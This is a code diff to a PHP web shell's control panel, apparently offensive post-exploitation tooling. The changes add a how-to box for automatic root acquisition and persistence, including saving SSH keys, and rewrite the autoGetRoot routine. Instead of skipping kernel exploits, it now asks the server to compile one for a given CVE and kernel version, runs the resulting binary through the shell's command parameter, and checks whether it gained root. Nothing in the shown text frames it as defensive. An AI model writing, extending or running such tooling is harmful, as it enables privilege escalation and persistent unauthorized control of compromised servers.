@@ -3523,7 +3523,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1959</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 2014</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4194,6 +4194,16 @@ function list_dir($path) {
                 <button onclick="scanPrivesc()" style="flex:1;min-width:80px;background:#0f0;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔍 Scan</button>
                 <button onclick="installPersistence()" style="flex:1;min-width:80px;background:#f80;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔒 Persist</button>
                 <button onclick="scanOtherShells()" style="flex:1;min-width:100px;background:#f44;color:#fff;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🕵️ Shells</button>
+            </div>
+            
+            <!-- Info Box -->
+            <div style="background:#1a1a00;border:1px solid #ff0;padding:8px;margin-bottom:10px;border-radius:4px;">
+                <p style="color:#ff0;margin:0;font-size:10px;font-weight:bold;">📖 HOW TO:</p>
+                <p style="color:#ccc;margin:3px 0 0 0;font-size:9px;line-height:1.4;">
+                    <strong>🔥 GET ROOT (AUTO)</strong> = Scan & auto-try ALL vectors (includes Kernel)<br>
+                    <strong>🐛 Kernel Auto-Compile</strong> = Manual kernel exploit (if AUTO fails)<br>
+                    <strong>🔒 Persist</strong> = Install AFTER root obtained (saves SSH keys, backups)
+                </p>
             </div>
             
             <!-- Advanced Attack Buttons -->
@@ -6382,11 +6392,51 @@ async function autoGetRoot() {
     for (const exploit of allExploits) {
         attempts++;
         
-        // Skip kernel exploits (need manual compilation)
+        // 🎯 TRY KERNEL EXPLOIT WITH AUTO-COMPILE!
         if (exploit.type === 'kernel') {
-            updateExploitProgress(attempts, maxAttempts, exploit.name + ' (skipped - needs compile)', 'kernel', 'failed');
-            log('[*] [' + attempts + '/' + maxAttempts + '] Skipping ' + exploit.name + ' (needs manual compile)', 'warn');
-            await new Promise(r => setTimeout(r, 100));
+            updateExploitProgress(attempts, maxAttempts, exploit.name + ' (auto-compiling...)', 'kernel', 'running');
+            log('[*] [' + attempts + '/' + maxAttempts + '] Attempting kernel: ' + exploit.name + ' with auto-compile');
+            
+            try {
+                // Try auto-compile kernel exploit
+                const compileForm = new FormData();
+                compileForm.append('action', 'kernel_auto_compile');
+                compileForm.append('cve', exploit.data.cve);
+                compileForm.append('kernel_version', exploit.data.kernel);
+                
+                const compileResp = await fetch('', { method: 'POST', body: compileForm });
+                const compileData = await compileResp.json();
+                
+                if (compileData.success && compileData.compiled_binary) {
+                    log('[+] Kernel compiled: ' + compileData.compiled_binary, 'success');
+                    
+                    // Execute compiled binary
+                    let execCmd = compileData.compiled_binary;
+                    if (compileData.method === 'python') {
+                        execCmd = 'python3 ' + execCmd + ' || python ' + execCmd;
+                    }
+                    
+                    const execForm = new FormData();
+                    execForm.append('cmd', execCmd);
+                    execForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+                    
+                    await fetch('', { method: 'POST', body: execForm });
+                    
+                    // Verify root
+                    const isRoot = await verifyRootAccess();
+                    if (isRoot) {
+                        rootObtained = true;
+                        log('[+] 🎉 ROOT via KERNEL: ' + exploit.name, 'success');
+                        break;
+                    }
+                } else {
+                    log('[!] Kernel compile failed: ' + (compileData.output || 'Unknown error'), 'error');
+                }
+            } catch (err) {
+                log('[!] Kernel exploit error: ' + err.message, 'error');
+            }
+            
+            updateExploitProgress(attempts, maxAttempts, exploit.name + ' (compile failed)', 'kernel', 'failed');
             continue;
         }
         
